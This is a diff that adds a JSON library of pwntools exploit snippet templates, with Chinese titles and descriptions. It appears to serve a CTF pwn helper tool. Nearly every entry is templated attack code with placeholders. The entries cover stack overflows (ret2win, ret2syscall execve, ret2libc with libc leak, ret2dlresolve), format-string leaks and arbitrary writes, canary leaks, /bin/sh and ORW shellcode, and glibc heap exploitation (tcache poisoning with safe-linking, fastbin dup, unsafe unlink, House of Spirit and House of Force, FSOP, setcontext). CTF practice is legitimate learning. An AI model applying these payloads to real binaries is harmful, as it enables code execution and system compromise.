@@ -1,0 +1,745 @@
+{
+  "blocks": [
+    {
+      "id": "base_pwntools",
+      "title": "pwntools 基础模板",
+      "category": "基础模板",
+      "description": "导入 pwntools、设置 context、加载 ELF，并提供 start() 入口。",
+      "snippet": "from pwn import *\n\ncontext(os='linux', arch='amd64', log_level='debug')\nelf = ELF('{{BINARY_PATH}}')\n\n\ndef start():\n    if args.REMOTE:\n        return remote('{{HOST}}', {{PORT}})\n    return process(elf.path)\n\np = start()\n",
+      "placeholders": [
+        "BINARY_PATH",
+        "HOST",
+        "PORT"
+      ],
+      "tags": [
+        "pwntools",
+        "template",
+        "start"
+      ]
+    },
+    {
+      "id": "context_amd64",
+      "title": "amd64 context",
+      "category": "基础模板",
+      "description": "设置 64 位 Linux pwn 常用上下文。",
+      "snippet": "context(os='linux', arch='amd64', log_level='debug')\n",
+      "placeholders": [],
+      "tags": [
+        "context",
+        "amd64"
+      ]
+    },
+    {
+      "id": "args_switch",
+      "title": "本地/远程切换",
+      "category": "连接方式",
+      "description": "使用 args.REMOTE 在 process 和 remote 之间切换。",
+      "snippet": "def start():\n    if args.REMOTE:\n        return remote('{{HOST}}', {{PORT}})\n    return process('{{BINARY_PATH}}')\n\np = start()\n",
+      "placeholders": [
+        "HOST",
+        "PORT",
+        "BINARY_PATH"
+      ],
+      "tags": [
+        "remote",
+        "process"
+      ]
+    },
+    {
+      "id": "remote_only",
+      "title": "远程连接",
+      "category": "连接方式",
+      "description": "只生成 remote 连接片段。",
+      "snippet": "p = remote('{{HOST}}', {{PORT}})\n",
+      "placeholders": [
+        "HOST",
+        "PORT"
+      ],
+      "tags": [
+        "remote"
+      ]
+    },
+    {
+      "id": "local_process",
+      "title": "本地 process",
+      "category": "连接方式",
+      "description": "只生成本地 process 连接片段。",
+      "snippet": "p = process('{{BINARY_PATH}}')\n",
+      "placeholders": [
+        "BINARY_PATH"
+      ],
+      "tags": [
+        "local",
+        "process"
+      ]
+    },
+    {
+      "id": "elf_libc_load",
+      "title": "ELF + libc 加载",
+      "category": "ELF 信息",
+      "description": "加载目标 ELF 和指定 libc。",
+      "snippet": "elf = ELF('{{BINARY_PATH}}')\nlibc = ELF('{{LIBC_PATH}}')\n",
+      "placeholders": [
+        "BINARY_PATH",
+        "LIBC_PATH"
+      ],
+      "tags": [
+        "elf",
+        "libc"
+      ]
+    },
+    {
+      "id": "symbols_notes",
+      "title": "常用符号引用",
+      "category": "ELF 信息",
+      "description": "GOT/PLT/symbols 常用写法。",
+      "snippet": "puts_plt = elf.plt['puts']\nputs_got = elf.got['puts']\nmain_addr = elf.symbols['main']\n",
+      "placeholders": [],
+      "tags": [
+        "got",
+        "plt",
+        "symbols"
+      ]
+    },
+    {
+      "id": "cyclic_find",
+      "title": "cyclic 偏移",
+      "category": "ROP/ret2libc",
+      "description": "生成 cyclic 和 cyclic_find 辅助片段。",
+      "snippet": "pattern = cyclic({{PATTERN_LEN}})\noffset = cyclic_find({{CRASH_VALUE}})\nlog.info(f'offset = {offset}')\n",
+      "placeholders": [
+        "PATTERN_LEN",
+        "CRASH_VALUE"
+      ],
+      "tags": [
+        "offset",
+        "cyclic"
+      ]
+    },
+    {
+      "id": "ret2win",
+      "title": "ret2win",
+      "category": "ROP/ret2libc",
+      "description": "最小 ret2win payload 模板，含栈对齐 ret。",
+      "snippet": "offset = {{OFFSET}}\nret = {{RET_GADGET}}\nwin = elf.symbols['{{WIN_SYMBOL}}']\n\npayload  = b'A' * offset\npayload += p64(ret)          # 64 位栈对齐\npayload += p64(win)\np.sendline(payload)\n",
+      "placeholders": [
+        "OFFSET",
+        "RET_GADGET",
+        "WIN_SYMBOL"
+      ],
+      "tags": [
+        "ret2win",
+        "overflow"
+      ]
+    },
+    {
+      "id": "ret2syscall",
+      "title": "ret2syscall",
+      "category": "ROP/系统调用",
+      "description": "通过 syscall gadget 构造 execve('/bin/sh', 0, 0) 链；gadget 和地址必须按目标文件确认。",
+      "snippet": "offset = {{OFFSET}}\nsyscall = {{SYSCALL_GADGET}}\npop_rax = {{POP_RAX}}\npop_rdi = {{POP_RDI}}\npop_rsi = {{POP_RSI}}\npop_rdx = {{POP_RDX}}\nbinsh = {{BINSH_ADDR}}\n\npayload  = b'A' * offset\npayload += p64(pop_rax) + p64(59)\npayload += p64(pop_rdi) + p64(binsh)\npayload += p64(pop_rsi) + p64(0)\npayload += p64(pop_rdx) + p64(0)\npayload += p64(syscall)\np.sendline(payload)\n",
+      "placeholders": [
+        "OFFSET",
+        "SYSCALL_GADGET",
+        "POP_RAX",
+        "POP_RDI",
+        "POP_RSI",
+        "POP_RDX",
+        "BINSH_ADDR"
+      ],
+      "tags": [
+        "ret2syscall",
+        "rop",
+        "syscall",
+        "execve"
+      ]
+    },
+    {
+      "id": "ret2libc_two_stage",
+      "title": "ret2libc 两阶段",
+      "category": "ROP/ret2libc",
+      "description": "泄漏 puts 地址后回 main，再调用 system('/bin/sh')。",
+      "snippet": "offset = {{OFFSET}}\nrop = ROP(elf)\npop_rdi = rop.find_gadget(['pop rdi', 'ret'])[0]\nret = rop.find_gadget(['ret'])[0]\n\npayload  = b'A' * offset\npayload += p64(pop_rdi) + p64(elf.got['puts'])\npayload += p64(elf.plt['puts'])\npayload += p64(elf.symbols['main'])\np.sendlineafter(b'{{PROMPT}}', payload)\nleak = u64(p.recvline().strip().ljust(8, b'\\x00'))\nlibc.address = leak - libc.symbols['puts']\nlog.success(f'libc = {hex(libc.address)}')\n\nbin_sh = next(libc.search(b'/bin/sh'))\nsystem = libc.symbols['system']\npayload  = b'A' * offset\npayload += p64(ret)\npayload += p64(pop_rdi) + p64(bin_sh)\npayload += p64(system)\np.sendlineafter(b'{{PROMPT}}', payload)\np.interactive()\n",
+      "placeholders": [
+        "OFFSET",
+        "PROMPT"
+      ],
+      "tags": [
+        "ret2libc",
+        "leak",
+        "puts"
+      ]
+    },
+    {
+      "id": "rop_manual_gadget",
+      "title": "手动 gadget 占位",
+      "category": "ROP/ret2libc",
+      "description": "手动填写 pop rdi / ret 等 gadget 地址。",
+      "snippet": "pop_rdi = {{POP_RDI}}\nret = {{RET_GADGET}}\n",
+      "placeholders": [
+        "POP_RDI",
+        "RET_GADGET"
+      ],
+      "tags": [
+        "gadget",
+        "rop"
+      ]
+    },
+    {
+      "id": "fmt_leak",
+      "title": "格式化字符串泄漏",
+      "category": "格式化字符串",
+      "description": "只生成 %p 泄漏 payload；发送位置按题目手动接入。",
+      "snippet": "payload = b'%{{START}}$p.%{{NEXT}}$p.%{{NEXT2}}$p'\n# 按题目输入点发送，例如：io.sendlineafter(b'> ', payload)\n",
+      "placeholders": [
+        "START",
+        "NEXT",
+        "NEXT2"
+      ],
+      "tags": [
+        "format-string",
+        "leak"
+      ]
+    },
+    {
+      "id": "fmtstr_payload",
+      "title": "fmtstr_payload 写入",
+      "category": "格式化字符串",
+      "description": "pwntools fmtstr_payload 任意写片段；只构造 payload。",
+      "snippet": "# 高阶备用：只构造 payload，不固定发送点。\npayload = fmtstr_payload(\n    {{OFFSET}},\n    { {{TARGET_ADDR}}: {{TARGET_VALUE}} },\n    write_size='{{WRITE_SIZE}}'\n)\n# 按题目输入点发送，例如：io.sendlineafter(b'> ', payload)\n",
+      "placeholders": [
+        "OFFSET",
+        "TARGET_ADDR",
+        "TARGET_VALUE",
+        "WRITE_SIZE"
+      ],
+      "tags": [
+        "format-string",
+        "write",
+        "fmtstr_payload"
+      ]
+    },
+    {
+      "id": "pack_p64",
+      "title": "p64 打包",
+      "category": "进制转换",
+      "description": "把整数地址打包成 64 位小端 bytes。",
+      "snippet": "addr = {{ADDR}}\npacked = p64(addr)\n",
+      "placeholders": [
+        "ADDR"
+      ],
+      "tags": [
+        "p64",
+        "little-endian"
+      ]
+    },
+    {
+      "id": "unpack_u64",
+      "title": "u64 解析泄漏",
+      "category": "进制转换",
+      "description": "把不足 8 字节的泄漏补齐后转整数。",
+      "snippet": "leak = u64(p.recvuntil(b'\\x7f')[-6:].ljust(8, b'\\x00'))\nlog.success(hex(leak))\n",
+      "placeholders": [],
+      "tags": [
+        "u64",
+        "leak"
+      ]
+    },
+    {
+      "id": "flat_payload",
+      "title": "手动 payload 拼接",
+      "category": "payload 工具",
+      "description": "不用 flat 的 payload 拼接骨架。",
+      "snippet": "# 少用 flat 的手动 payload 拼接写法；复杂洞再改回 flat 也行。\npayload  = b'A' * {{OFFSET}}\npayload += p64({{ADDR1}})\npayload += p64({{ADDR2}})\n",
+      "placeholders": [
+        "OFFSET",
+        "ADDR1",
+        "ADDR2"
+      ],
+      "tags": [
+        "payload",
+        "flat"
+      ]
+    },
+    {
+      "id": "recv_send",
+      "title": "recvuntil + sendline",
+      "category": "IO 交互",
+      "description": "常见菜单题等待提示后发送。",
+      "snippet": "p.recvuntil(b'{{PROMPT}}')\np.sendline({{DATA}})\n",
+      "placeholders": [
+        "PROMPT",
+        "DATA"
+      ],
+      "tags": [
+        "io",
+        "menu"
+      ]
+    },
+    {
+      "id": "menu_helpers",
+      "title": "菜单函数骨架",
+      "category": "IO 交互",
+      "description": "菜单题常用 choice/add/delete/show 函数骨架。",
+      "snippet": "def choice(idx):\n    p.sendlineafter(b'> ', str(idx).encode())\n\ndef add(data):\n    choice(1)\n    p.sendafter(b'data: ', data)\n\ndef delete(idx):\n    choice(2)\n    p.sendlineafter(b'index: ', str(idx).encode())\n\ndef show(idx):\n    choice(3)\n    p.sendlineafter(b'index: ', str(idx).encode())\n",
+      "placeholders": [],
+      "tags": [
+        "menu",
+        "helper"
+      ]
+    },
+    {
+      "id": "interactive",
+      "title": "interactive",
+      "category": "IO 交互",
+      "description": "切到交互模式的文本片段。",
+      "snippet": "p.interactive()\n",
+      "placeholders": [],
+      "tags": [
+        "interactive"
+      ]
+    },
+    {
+      "id": "gdb_attach",
+      "title": "gdb.attach(io) + pause",
+      "category": "调试辅助",
+      "description": "固定插入你常用的 gdb.attach(io) 和 pause()。",
+      "snippet": "gdb.attach(io)\npause()\n",
+      "placeholders": [],
+      "tags": [
+        "gdb",
+        "pause",
+        "debug"
+      ]
+    },
+    {
+      "id": "log_helpers",
+      "title": "log 辅助",
+      "category": "调试辅助",
+      "description": "常用地址输出格式。",
+      "snippet": "log.info('target = %#x', {{ADDR}})\nlog.success('libc = %#x', libc.address)\n",
+      "placeholders": [
+        "ADDR"
+      ],
+      "tags": [
+        "log",
+        "debug"
+      ]
+    },
+    {
+      "id": "base_i386_wsl_header",
+      "title": "i386 WSL 调试头部",
+      "category": "基础模板",
+      "description": "你常用的 32 位 pwntools 头部，适配 Windows 调 WSL bash。",
+      "snippet": "from pwn import*\n\ncontext(arch='i386',os='linux',log_level='debug')\ncontext.terminal=['cmd.exe','/c','wsl.exe','bash','-c']\n",
+      "placeholders": [],
+      "tags": [
+        "i386",
+        "header",
+        "wsl"
+      ]
+    },
+    {
+      "id": "base64_custom_table",
+      "title": "自定义 base64 表",
+      "category": "编码/加密辅助",
+      "description": "自定义 base64 字母表的字符串和数字编码函数。",
+      "snippet": "import base64\n\nstd=b'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/'\ncustom=b'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789+/'\nenc_table=bytes.maketrans(std,custom)\n\ndef base64enc(data):\n    return base64.b64encode(data).translate(enc_table)\n\ndef base64num(num):\n    s=str(num).encode()\n    return base64.b64encode(s).translate(enc_table)\n",
+      "placeholders": [],
+      "tags": [
+        "base64",
+        "custom",
+        "encode"
+      ]
+    },
+    {
+      "id": "shellcraft_orw",
+      "title": "沙箱 ORW shellcode",
+      "category": "沙箱检测",
+      "description": "常见 seccomp 只放行 open/read/write 时的 ORW shellcode 文本。",
+      "snippet": "shellcode = shellcraft.open('{{FLAG_PATH}}')\nshellcode += shellcraft.read('rax', 'rsp', 0x100)\nshellcode += shellcraft.write(1, 'rsp', 0x100)\npayload = asm(shellcode)\nio.send(payload)\n",
+      "placeholders": [
+        "FLAG_PATH"
+      ],
+      "tags": [
+        "seccomp",
+        "orw",
+        "shellcode"
+      ]
+    },
+    {
+      "id": "syscall_constants",
+      "title": "常用 syscall 号",
+      "category": "沙箱检测",
+      "description": "ORW 和 seccomp 题里常用 syscall 常量速查。",
+      "snippet": "SYS_read = 0\nSYS_write = 1\nSYS_open = 2\nSYS_openat = 257\nSYS_execve = 59\nSYS_mprotect = 10\n",
+      "placeholders": [],
+      "tags": [
+        "seccomp",
+        "syscall",
+        "orw"
+      ]
+    },
+    {
+      "id": "i386_ret2libc",
+      "title": "i386 ret2libc",
+      "category": "ROP/ret2libc",
+      "description": "32 位 ret2libc 常用 payload 形状：system + fake_ret + /bin/sh。",
+      "snippet": "offset = {{OFFSET}}\nsystem_addr = {{SYSTEM_ADDR}}\nbinsh = {{BINSH_ADDR}}\nfake_ret = {{RETURN_ADDR}}\n\npayload  = b'A' * offset\npayload += p32(system_addr)\npayload += p32(fake_ret)\npayload += p32(binsh)\np.sendline(payload)\n",
+      "placeholders": [
+        "OFFSET",
+        "SYSTEM_ADDR",
+        "BINSH_ADDR",
+        "RETURN_ADDR"
+      ],
+      "tags": [
+        "i386",
+        "ret2libc",
+        "system"
+      ]
+    },
+    {
+      "id": "fmt_offset_probe",
+      "title": "fmt offset 探测",
+      "category": "格式化字符串",
+      "description": "构造 AAAA + 多个 %p 的 offset 探测 payload；发送位置手动接入。",
+      "snippet": "payload = b'AAAA.' + b'.'.join([f'%{i}$p'.encode() for i in range({{START}}, {{END}})])\n# 按题目输入点发送 payload，再观察回显定位 AAAA/0x41414141。\n",
+      "placeholders": [
+        "START",
+        "END"
+      ],
+      "tags": [
+        "format-string",
+        "offset",
+        "probe"
+      ]
+    },
+    {
+      "id": "shellcode_i386_sh",
+      "title": "i386 shellcode",
+      "category": "Shellcode",
+      "description": "生成 /bin/sh shellcode 文本，不在工具内执行。",
+      "snippet": "shellcode = asm(shellcraft.sh())\nlog.info(f'shellcode len = {len(shellcode)}')\n",
+      "placeholders": [],
+      "tags": [
+        "shellcode",
+        "i386",
+        "asm"
+      ]
+    },
+    {
+      "id": "leak_parse_i386",
+      "title": "i386 泄漏解析",
+      "category": "泄漏解析",
+      "description": "32 位地址泄漏解析，适合 recv 4 字节或行尾截取。",
+      "snippet": "leak = u32(p.recv({{RECV_LEN}}).ljust(4, b'\\x00'))\nlog.success(f'leak = {hex(leak)}')\n",
+      "placeholders": [
+        "RECV_LEN"
+      ],
+      "tags": [
+        "leak",
+        "u32",
+        "i386"
+      ]
+    },
+    {
+      "id": "canary_leak_fmt",
+      "title": "canary 泄漏模板",
+      "category": "栈溢出",
+      "description": "用格式化字符串泄漏 canary 后拼回 payload。",
+      "snippet": "p.sendline(b'%{{CANARY_POS}}$p')\ncanary = int(p.recvline().strip(), 16)\nlog.success(f'canary = {hex(canary)}')\n\npayload  = b'A' * {{PADDING_LEN}}\npayload += p64(canary)\npayload += b'B' * {{SAVED_REG_LEN}}\npayload += p64({{RETURN_ADDR}})\n",
+      "placeholders": [
+        "CANARY_POS",
+        "PADDING_LEN",
+        "SAVED_REG_LEN",
+        "RETURN_ADDR"
+      ],
+      "tags": [
+        "canary",
+        "fmt",
+        "overflow"
+      ]
+    },
+    {
+      "id": "tcache_poison_skeleton",
+      "title": "tcache poisoning 骨架",
+      "category": "堆利用",
+      "description": "菜单堆题常见 double free / tcache poisoning 代码形状。",
+      "snippet": "# 需要按题目菜单改 add/delete/edit/show\nsize = {{REQUEST_SIZE}}\ntarget = {{TARGET_ADDR}}\nvalue = {{WRITE_VALUE}}\n\nadd(size, b'A')\nadd(size, b'B')\ndelete({{CHUNK_A_INDEX}})\ndelete({{CHUNK_B_INDEX}})\ndelete({{CHUNK_A_INDEX}})\nadd(size, p64(target))\nadd(size, b'C')\nadd(size, b'D')\nadd(size, p64(value))\n",
+      "placeholders": [
+        "REQUEST_SIZE",
+        "CHUNK_A_INDEX",
+        "CHUNK_B_INDEX",
+        "TARGET_ADDR",
+        "WRITE_VALUE"
+      ],
+      "tags": [
+        "heap",
+        "tcache",
+        "poisoning"
+      ]
+    },
+    {
+      "id": "one_gadget_note",
+      "title": "one_gadget 占位",
+      "category": "ROP/ret2libc",
+      "description": "泄漏 libc 后写 one_gadget 的常用占位片段。",
+      "snippet": "one_gadget = libc.address + {{ONE_GADGET_OFFSET}}\nlog.success(f'one_gadget = {hex(one_gadget)}')\n",
+      "placeholders": [
+        "ONE_GADGET_OFFSET"
+      ],
+      "tags": [
+        "one_gadget",
+        "libc"
+      ]
+    },
+    {
+      "id": "ret2dlresolve_note",
+      "title": "ret2dlresolve 提纲",
+      "category": "ROP/ret2libc",
+      "description": "没有 libc 泄漏时的 ret2dlresolve pwntools 写法提纲。",
+      "snippet": "dlresolve = Ret2dlresolvePayload(elf, symbol='system', args=['/bin/sh'])\nrop = ROP(elf)\nrop.read(0, dlresolve.data_addr, len(dlresolve.payload))\nrop.ret2dlresolve(dlresolve)\npayload = b'A' * {{OFFSET}} + rop.chain()\np.sendline(payload)\np.sendline(dlresolve.payload)\n",
+      "placeholders": [
+        "OFFSET"
+      ],
+      "tags": [
+        "ret2dlresolve",
+        "rop"
+      ]
+    },
+    {
+      "id": "heap_menu_full_helpers",
+      "title": "堆菜单函数骨架",
+      "category": "堆利用",
+      "description": "常见 add/edit/delete/show 菜单题函数骨架，按题目提示符再细调。",
+      "snippet": "def choice(idx):\n    io.sendlineafter(b'> ', str(idx).encode())\n\ndef add(size, data=b'A'):\n    choice(1)\n    io.sendlineafter(b'size: ', str(size).encode())\n    io.sendafter(b'content: ', data)\n\ndef edit(idx, data):\n    choice(2)\n    io.sendlineafter(b'index: ', str(idx).encode())\n    io.sendafter(b'content: ', data)\n\ndef delete(idx):\n    choice(3)\n    io.sendlineafter(b'index: ', str(idx).encode())\n\ndef show(idx):\n    choice(4)\n    io.sendlineafter(b'index: ', str(idx).encode())\n",
+      "placeholders": [],
+      "tags": [
+        "heap",
+        "menu",
+        "helper"
+      ]
+    },
+    {
+      "id": "heap_unsorted_bin_leak",
+      "title": "unsorted bin libc 泄漏",
+      "category": "堆利用",
+      "description": "glibc 2.23-2.31 常见 unsorted bin 泄漏 main_arena 指针模板。",
+      "snippet": "add(0x500, b'A')\nadd(0x20, b'guard')\ndelete(0)\nshow(0)\nleak = u64(io.recvuntil(b'\\x7f')[-6:].ljust(8, b'\\x00'))\nmain_arena_offset = {{MAIN_ARENA_OFFSET}}\nlibc.address = leak - main_arena_offset\nlog.success(f'libc = {hex(libc.address)}')\n",
+      "placeholders": [
+        "MAIN_ARENA_OFFSET"
+      ],
+      "tags": [
+        "heap",
+        "unsorted",
+        "libc",
+        "2.23",
+        "2.31"
+      ]
+    },
+    {
+      "id": "heap_tcache_dup_231",
+      "title": "tcache dup <= 2.31",
+      "category": "堆利用",
+      "description": "glibc 2.27-2.31 常见 tcache double free / poisoning 形状。",
+      "snippet": "size = {{REQUEST_SIZE}}\ntarget = {{TARGET_ADDR}}\nvalue = {{WRITE_VALUE}}\n\nadd(size, b'A')\nadd(size, b'B')\ndelete({{CHUNK_A_INDEX}})\ndelete({{CHUNK_B_INDEX}})\ndelete({{CHUNK_A_INDEX}})\nadd(size, p64(target))\nadd(size, b'C')\nadd(size, b'D')\nadd(size, p64(value))\n",
+      "placeholders": [
+        "REQUEST_SIZE",
+        "CHUNK_A_INDEX",
+        "CHUNK_B_INDEX",
+        "TARGET_ADDR",
+        "WRITE_VALUE"
+      ],
+      "tags": [
+        "heap",
+        "tcache",
+        "2.27",
+        "2.31"
+      ]
+    },
+    {
+      "id": "heap_tcache_safelinking_232",
+      "title": "tcache safe-linking >= 2.32",
+      "category": "堆利用",
+      "description": "glibc 2.32+ tcache poisoning，使用 fd 保存位置地址参与 safe-linking 编码。",
+      "snippet": "size = {{REQUEST_SIZE}}\nfd_storage = {{FD_STORAGE_ADDR}}\ntarget = {{TARGET_ADDR}}\nencoded_fd = target ^ (fd_storage >> 12)\nlog.info(f'encoded fd = {hex(encoded_fd)}')\nedit({{CHUNK_A_INDEX}}, p64(encoded_fd))\nadd(size, b'A')\nadd(size, p64({{WRITE_VALUE}}))\n",
+      "placeholders": [
+        "REQUEST_SIZE",
+        "FD_STORAGE_ADDR",
+        "TARGET_ADDR",
+        "CHUNK_A_INDEX",
+        "WRITE_VALUE"
+      ],
+      "tags": [
+        "heap",
+        "tcache",
+        "safe-linking",
+        "2.32",
+        "2.35"
+      ]
+    },
+    {
+      "id": "heap_fastbin_dup_223",
+      "title": "fastbin dup <= 2.23",
+      "category": "堆利用",
+      "description": "glibc 2.23 常见 fastbin double free，常用于 malloc_hook 或任意写目标。",
+      "snippet": "size = {{REQUEST_SIZE}}\ntarget = {{TARGET_ADDR}}\nfinal_payload = {{FINAL_PAYLOAD}}\n\nadd(size, b'A')\nadd(size, b'B')\nadd(size, b'C')\ndelete({{CHUNK_A_INDEX}})\ndelete({{CHUNK_B_INDEX}})\ndelete({{CHUNK_A_INDEX}})\nadd(size, p64(target))\nadd(size, b'D')\nadd(size, b'E')\nadd(size, final_payload)\n",
+      "placeholders": [
+        "REQUEST_SIZE",
+        "CHUNK_A_INDEX",
+        "CHUNK_B_INDEX",
+        "TARGET_ADDR",
+        "FINAL_PAYLOAD"
+      ],
+      "tags": [
+        "heap",
+        "fastbin",
+        "2.23"
+      ]
+    },
+    {
+      "id": "heap_unlink_unsafe",
+      "title": "unsafe unlink 模板",
+      "category": "堆利用",
+      "description": "glibc 2.23 常见 unsafe unlink，伪造 fd/bk 指向指针数组附近。",
+      "snippet": "ptr = {{PTR_ARRAY_ADDR}}\nfake  = p64(0) + p64(0x91)\nfake += p64(ptr - 0x18)\nfake += p64(ptr - 0x10)\nfake  = fake.ljust(0x80, b'A')\nfake += p64(0x90) + p64(0xa0)\nedit({{CHUNK_A_INDEX}}, fake)\ndelete({{CHUNK_B_INDEX}})\n",
+      "placeholders": [
+        "PTR_ARRAY_ADDR",
+        "CHUNK_A_INDEX",
+        "CHUNK_B_INDEX"
+      ],
+      "tags": [
+        "heap",
+        "unlink",
+        "2.23"
+      ]
+    },
+    {
+      "id": "heap_house_of_spirit",
+      "title": "House of Spirit",
+      "category": "堆利用",
+      "description": "伪造 chunk 后让 free/malloc 返回栈上或可控区域的 fake chunk。",
+      "snippet": "fake_chunk = {{FAKE_CHUNK_ADDR}}\npayload  = b'A' * {{PADDING_LEN}}\npayload += p64(0) + p64({{CHUNK_SIZE}})\npayload += p64(fake_chunk)\nio.sendline(payload)\n# 后续释放指向 fake_chunk 的指针，再申请同 size 取回 fake chunk\n",
+      "placeholders": [
+        "FAKE_CHUNK_ADDR",
+        "PADDING_LEN",
+        "CHUNK_SIZE"
+      ],
+      "tags": [
+        "heap",
+        "house-of-spirit"
+      ]
+    },
+    {
+      "id": "heap_house_of_force",
+      "title": "House of Force",
+      "category": "堆利用",
+      "description": "glibc 2.23 top chunk size 改成 -1 后控制下一次 top chunk 分配位置。",
+      "snippet": "top_addr = {{TOP_CHUNK_ADDR}}\ntarget = {{TARGET_ADDR}}\npadding = {{PADDING_LEN}}\nedit({{CHUNK_A_INDEX}}, b'A' * padding + p64(0xffffffffffffffff))\nrequest_size = target - top_addr - 0x20\nadd(request_size, b'pad')\nadd({{REQUEST_SIZE}}, {{FINAL_PAYLOAD}})\n",
+      "placeholders": [
+        "TOP_CHUNK_ADDR",
+        "TARGET_ADDR",
+        "PADDING_LEN",
+        "CHUNK_A_INDEX",
+        "REQUEST_SIZE",
+        "FINAL_PAYLOAD"
+      ],
+      "tags": [
+        "heap",
+        "house-of-force",
+        "2.23"
+      ]
+    },
+    {
+      "id": "heap_fsop_stdout_leak",
+      "title": "FSOP stdout 泄漏",
+      "category": "堆利用",
+      "description": "覆盖 stdout flags/_IO_write_base 等字段制造 libc 泄漏。",
+      "snippet": "stdout = libc.symbols['_IO_2_1_stdout_']\npayload = p64(0xfbad1800)\npayload += p64(0) * 3\npayload += p8(0x00)\nedit({{CHUNK_A_INDEX}}, payload)\nleak = u64(io.recvuntil(b'\\x7f')[-6:].ljust(8, b'\\x00'))\nlog.success(f'leak = {hex(leak)}')\n",
+      "placeholders": [
+        "CHUNK_A_INDEX"
+      ],
+      "tags": [
+        "heap",
+        "fsop",
+        "stdout",
+        "2.23",
+        "2.31"
+      ]
+    },
+    {
+      "id": "heap_setcontext_orw_234",
+      "title": "setcontext ORW >= 2.34",
+      "category": "堆利用",
+      "description": "glibc 2.34+ hooks 不可用时，布局 setcontext + ORW 的提示模板。",
+      "snippet": "setcontext = libc.symbols['setcontext'] + {{SETCONTEXT_OFFSET}}\nrop_addr = {{ROP_ADDR}}\nret_addr = {{RET_ADDR}}\nframe = SigreturnFrame()\nframe.rsp = rop_addr\nframe.rip = ret_addr\n# 常见入口：exit handlers / IO_FILE / tcache poisoning 指向的控制流目标\nlog.info(f'setcontext = {hex(setcontext)}')\n",
+      "placeholders": [
+        "SETCONTEXT_OFFSET",
+        "ROP_ADDR",
+        "RET_ADDR"
+      ],
+      "tags": [
+        "heap",
+        "setcontext",
+        "orw",
+        "2.34",
+        "2.35"
+      ]
+    },
+    {
+      "id": "fmt_low_high_i386",
+      "title": "low/high 分段",
+      "category": "格式化字符串",
+      "description": "按当前 system_addr 之类变量拆成 low/high，供 %hn 两段写使用。",
+      "snippet": "low  = {{VALUE_VAR}} & 0xffff\nhigh = ({{VALUE_VAR}} >> 16) & 0xffff\n",
+      "placeholders": [
+        "VALUE_VAR"
+      ],
+      "tags": [
+        "format-string",
+        "hn",
+        "low-high",
+        "i386"
+      ]
+    },
+    {
+      "id": "fmt_s_read_payload",
+      "title": "p32(addr)+%s 泄漏 payload",
+      "category": "格式化字符串",
+      "description": "构造地址 + %s 任意读 payload；不固定 send/sendafter。",
+      "snippet": "target_addr = {{TARGET_ADDR}}\npayload  = p32(target_addr)\npayload += f'%{{FMT_OFFSET}}$s'.encode()\n# 按题目输入点发送，例如：{{IO_NAME}}.sendlineafter({{PROMPT}}, payload)\n",
+      "placeholders": [
+        "TARGET_ADDR",
+        "FMT_OFFSET",
+        "IO_NAME",
+        "PROMPT"
+      ],
+      "tags": [
+        "format-string",
+        "leak",
+        "s",
+        "i386"
+      ]
+    },
+    {
+      "id": "fmt_hn_write_payload_i386",
+      "title": "两次 %hn 覆盖 payload",
+      "category": "格式化字符串",
+      "description": "i386 两次 %hn 写 payload 片段，依赖 low/high；格式串在前，地址追加在末尾。",
+      "snippet": "# 先插入/设置 low/high，再构造 payload；offset 指向 payload 末尾追加的第一个地址。\nfmt_offset = {{FMT_OFFSET}}\nprintf_got = {{TARGET_ADDR}}\nwrite_targets = [(0, printf_got, low), (1, printf_got + 2, high)]\nfmt = b''\nprinted = {{NUMBWRITTEN}}\nfor slot, addr, value in sorted(write_targets, key=lambda item: item[2]):\n    pad = (value - printed) % 0x10000\n    if pad:\n        fmt += f'%{pad}c'.encode()\n    fmt += f'%{fmt_offset + slot}$hn'.encode()\n    printed = value\npayload = fmt.ljust(((len(fmt) + 3) // 4) * 4, b'A')\npayload += b''.join(p32(addr) for _slot, addr, _value in write_targets)\npayload += b'\\n'\n# 按题目输入点发送，例如：io.sendlineafter({{PROMPT}}, payload)\n",
+      "placeholders": [
+        "FMT_OFFSET",
+        "TARGET_ADDR",
+        "NUMBWRITTEN",
+        "PROMPT"
+      ],
+      "tags": [
+        "format-string",
+        "got",
+        "i386",
+        "hn",
+        "low-high"
+      ]
+    }
+  ]
+}
